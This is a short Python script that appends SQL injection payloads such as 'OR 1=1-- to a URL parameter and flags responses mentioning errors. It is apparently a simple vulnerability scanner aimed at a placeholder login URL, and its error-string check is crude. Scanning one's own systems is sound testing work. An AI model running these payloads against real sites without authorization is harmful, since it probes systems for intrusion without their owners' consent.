import requests
def check_sql_injection(url):
    payloads = ["'", '"', "';--", "')", "'OR 1=1--", "'OR '1'='1", "'='", "1'1"]
    for payload in payloads:
        test_url = f"{url}{payload}"
        response = requests.get(test_url)
        # Check for potential signs of SQL injection in the response
        if "error" in response.text.lower() or "exception" in response.text.lower():
            print(f"Potential SQL Injection Vulnerability found at: {test_url}")
            return

    print("No SQL Injection Vulnerabilities detected.")

# Example usage:
if __name__ == '__main__':
    target_url = "http://example.com/login?id="
    check_sql_injection(target_url)